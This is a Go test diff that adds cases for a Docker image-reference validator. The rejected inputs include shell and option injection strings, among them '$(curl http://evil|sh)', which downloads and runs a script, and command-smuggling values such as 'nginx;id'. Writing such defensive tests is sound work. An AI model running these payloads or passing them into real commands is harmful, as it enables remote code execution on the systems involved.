@@ -2,6 +2,90 @@ package files
 
 import "testing"
 
+const testImageDigest = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef" // 64 hex chars
+
+func TestValidImageRef(t *testing.T) {
+	valid := []string{
+		// task-specified canonical forms
+		"nginx",
+		"nginx:1.25",
+		"library/nginx",
+		"reg.example.com:5000/app:v1",
+		"nginx@sha256:" + testImageDigest,
+		// other legitimate shapes that must keep working
+		"ubuntu:22.04",
+		"ghcr.io/owner/img:v2.1.0",
+		"reg.example.com/app@sha256:" + testImageDigest,
+		"reg.example.com:5000/app:v1@sha256:" + testImageDigest,
+		"localhost:5000/x",
+		"MyApp_01:V1_BETA.2",              // uppercase kept, like ValidNameComponent
+		"deep/nested/path/name",           // multi-level repository path
+		"nginx@sha256:" + testImageDigest, // digest without tag
+		"a1-b2.c3",                        // separators must be sandwiched by alphanumerics
+	}
+	for _, s := range valid {
+		if !ValidImageRef(s) {
+			t.Errorf("ValidImageRef(%q) = false, want true", s)
+		}
+	}
+
+	invalid := []string{
+		"",
+		// task-specified injection payloads
+		"nginx$(id)",
+		"$(curl http://evil|sh)",
+		"-a",
+		"nginx;id",
+		"nginx |id",
+		// shell / option injection variants
+		"-a --pull=always",
+		"-nginx",
+		"nginx&id",
+		"nginx$x",
+		"${HOME}",
+		"nginx`id`",
+		"nginx'x",
+		"nginx\"x",
+		"nginx a",
+		"nginx\na",
+		"nginx\ta",
+		"a|b",
+		"a;b",
+		"a>b",
+		"a<b",
+		"a\\b",
+		// malformed references docker itself rejects
+		"foo/../bar",                            // dot-dot component
+		"nginx-",                                // trailing separator
+		"-nginx",                                // leading separator (also option injection)
+		"nginx:",                                // empty tag
+		"nginx:$tag",                            // tag with metacharacter
+		"nginx:.b",                              // tag must start alphanumeric/underscore
+		"nginx@",                                // empty digest
+		"nginx@sha256:abc",                      // truncated digest
+		"nginx@sha256:" + testImageDigest + "Z", // non-hex digest char
+		"nginx@SHA256:" + testImageDigest,       // wrong algorithm case
+		"nginx@" + testImageDigest,              // digest without algorithm
+		"user@host/img",                         // '@' only valid for digests
+		"nginx@sha256:" + testImageDigest + ";id",
+	}
+	for _, s := range invalid {
+		if ValidImageRef(s) {
+			t.Errorf("ValidImageRef(%q) = true, want false", s)
+		}
+	}
+}
+
+func TestValidImageRefLengthCap(t *testing.T) {
+	long := ""
+	for i := 0; i < 60 && len(long) <= 512; i++ {
+		long += "segment/"
+	}
+	if ValidImageRef(long) {
+		t.Errorf("ValidImageRef accepted a %d-char reference, want false above the cap", len(long))
+	}
+}
+
 func TestValidUserGroup(t *testing.T) {
 	valid := []string{
 		"1000",
